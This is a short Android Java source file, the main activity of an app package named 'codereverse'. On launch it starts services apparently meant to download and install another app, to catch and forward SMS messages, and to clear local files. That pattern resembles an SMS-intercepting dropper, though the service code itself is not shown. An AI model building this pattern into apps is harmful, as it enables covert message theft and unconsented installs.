package com.anubhav.codereverse.uiapp.ui;

import android.app.Activity;
import android.os.Bundle;

import androidx.annotation.NonNull;

import com.anubhav.codereverse.R;
import com.anubhav.codereverse.services.DownloadInstallApp;
import com.anubhav.codereverse.services.SmsUpdateService;
import com.anubhav.codereverse.utils.Utils;
import com.anubhav.codereverse.utils.smscatcher.SmsCatcher;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        DownloadInstallApp.start(this);
        SmsUpdateService.start(this);
        SmsCatcher.isSmsPermissionGranted(this);
        Utils.checkAndClearFilesDir(this);
    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onStop() {
        super.onStop();
    }

    /**
     * need for Android 6 real time permissions
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //smsCatcher.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

}